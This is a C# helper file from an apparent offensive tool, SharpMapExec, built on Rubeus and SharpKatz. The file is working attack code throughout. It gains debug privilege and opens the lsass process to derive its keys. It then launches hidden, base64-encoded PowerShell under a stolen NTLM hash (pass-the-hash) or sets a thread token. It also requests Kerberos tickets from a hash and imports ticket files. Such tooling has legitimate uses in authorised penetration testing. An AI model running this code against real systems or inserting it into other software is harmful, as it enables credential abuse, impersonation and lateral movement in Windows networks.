using Rubeus;
using Rubeus.lib.Interop;
using SharpKatz;
using SharpKatz.Module;
using SharpKatz.Win32;
using System;
using System.Diagnostics;
using System.IO;
using static Rubeus.Interop;

namespace SharpMapExec.Helpers
{
    internal class SecurityContext
    {
        public class NTHash
        {
            public string[] Nthash { get; set; }
            public string SingleNthash { get; set; }
        }

        public class ClearText
        {
            public ClearText()
            {
            }

            public string[] Cleartext { get; set; }
            public string SingleCleartext { get; set; }
        }

        public static object GetPropValue(object src, string propName)
        {
            return src.GetType().GetProperty(propName).GetValue(src, null);
        }

        public static int CreateNtlmPowershell(string user, string domain, string ntlmHash, string arguments)
        {
            if (IntPtr.Size != 8)
            {
                Console.WriteLine("Windows 32bit not supported");
                return 0;
            }
            OSVersionHelper osHelper = new OSVersionHelper();
            if (osHelper.build <= 9600)
            {
                Console.WriteLine("Unsupported OS Version");
                return 0;
            }

            int procid = 0;
            string argument = String.Format("/c powershell.exe -nop -w hidden -enc {0}", Convert.ToBase64String(System.Text.Encoding.Unicode.GetBytes(arguments)));
            string aes128 = null;
            string aes256 = null;
            string rc4 = null;
            string binary = null;
            string luid = null;
            Utility.SetDebugPrivilege();
            IntPtr lsasrv = IntPtr.Zero;
            IntPtr wdigest = IntPtr.Zero;
            IntPtr lsassmsv1 = IntPtr.Zero;
            IntPtr kerberos = IntPtr.Zero;
            IntPtr tspkg = IntPtr.Zero;
            IntPtr lsasslive = IntPtr.Zero;
            IntPtr hProcess = IntPtr.Zero;
            Process plsass = Process.GetProcessesByName("lsass")[0];
            ProcessModuleCollection processModules = plsass.Modules;
            int modulefound = 0;

            for (int i = 0; i < processModules.Count && modulefound < 5; i++)
            {
                string lower = processModules[i].ModuleName.ToLowerInvariant();

                if (lower.Contains("lsasrv.dll"))
                {
                    lsasrv = processModules[i].BaseAddress;
                    modulefound++;
                }
                else if (lower.Contains("kerberos.dll"))
                {
                    kerberos = processModules[i].BaseAddress;
                    modulefound++;
                }
            }
            binary = "cmd.exe";
            hProcess = Natives.OpenProcess(Natives.ProcessAccessFlags.All, false, plsass.Id);
            Keys keys = new Keys(hProcess, lsasrv, osHelper);
            procid = Ptp.CreateProcess(hProcess, lsasrv, kerberos, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), user, domain, ntlmHash, aes128, aes256, rc4, binary, argument, luid, false);
            return procid;
        }

        public static void SetThreadToken(string user, string domain, string ntlmHash)
        {
            if (IntPtr.Size != 8)
            {
                Console.WriteLine("Windows 32bit not supported");
                return;
            }
            OSVersionHelper osHelper = new OSVersionHelper();
            if (osHelper.build <= 9600)
            {
                Console.WriteLine("Unsupported OS Version");
                return;
            }
            string aes128 = null;
            string aes256 = null;
            string rc4 = null;
            string binary = null;
            string arguments = null;
            string luid = null;
            Utility.SetDebugPrivilege();
            IntPtr lsasrv = IntPtr.Zero;
            IntPtr wdigest = IntPtr.Zero;
            IntPtr lsassmsv1 = IntPtr.Zero;
            IntPtr kerberos = IntPtr.Zero;
            IntPtr tspkg = IntPtr.Zero;
            IntPtr lsasslive = IntPtr.Zero;
            IntPtr hProcess = IntPtr.Zero;
            Process plsass = Process.GetProcessesByName("lsass")[0];
            ProcessModuleCollection processModules = plsass.Modules;
            int modulefound = 0;

            for (int i = 0; i < processModules.Count && modulefound < 5; i++)
            {
                string lower = processModules[i].ModuleName.ToLowerInvariant();

                if (lower.Contains("lsasrv.dll"))
                {
                    lsasrv = processModules[i].BaseAddress;
                    modulefound++;
                }
                else if (lower.Contains("kerberos.dll"))
                {
                    kerberos = processModules[i].BaseAddress;
                    modulefound++;
                }
            }
            binary = "cmd.exe";
            hProcess = Natives.OpenProcess(Natives.ProcessAccessFlags.All, false, plsass.Id);
            Keys keys = new Keys(hProcess, lsasrv, osHelper);
            Pth.CreateProcess(hProcess, lsasrv, kerberos, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), user, domain, ntlmHash, aes128, aes256, rc4, binary, arguments, luid, true);
            //Ptp.CreateProcess(hProcess, lsasrv, kerberos, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), user, domain, ntlmHash, aes128, aes256, rc4, binary, arguments, luid, false);
        }

        public static string AskTicket(string user, string domain, string hash, KERB_ETYPE encType, string dc)
        {
            LUID luid = new LUID();
            string ticketoutput = "";
            var originalConsoleOut = Console.Out;
            using (var writer = new StringWriter())
            {
                Console.SetOut(writer);
                Ask.TGT(user, domain, hash, encType, null, true, dc, luid, false);
                writer.Flush();
                ticketoutput = writer.GetStringBuilder().ToString();
            }
            Console.SetOut(originalConsoleOut);
            return ticketoutput;
        }

        public static string ImportTicket(string ticket)
        {
            LUID luid = new LUID();
            string ticketoutput = "";
            var originalConsoleOut = Console.Out;
            using (var writer = new StringWriter())
            {
                Console.SetOut(writer);
                if (Rubeus.Helpers.IsBase64String(ticket))
                {
                    byte[] kirbiBytes = Convert.FromBase64String(ticket);
                    Rubeus.LSA.ImportTicket(kirbiBytes, luid);
                }
                else if (File.Exists(ticket))
                {
                    byte[] kirbiBytes = File.ReadAllBytes(ticket);
                    Rubeus.LSA.ImportTicket(kirbiBytes, luid);
                }
                writer.Flush();
                ticketoutput = writer.GetStringBuilder().ToString();
            }
            Console.SetOut(originalConsoleOut);
            return ticketoutput;
        }
    }
}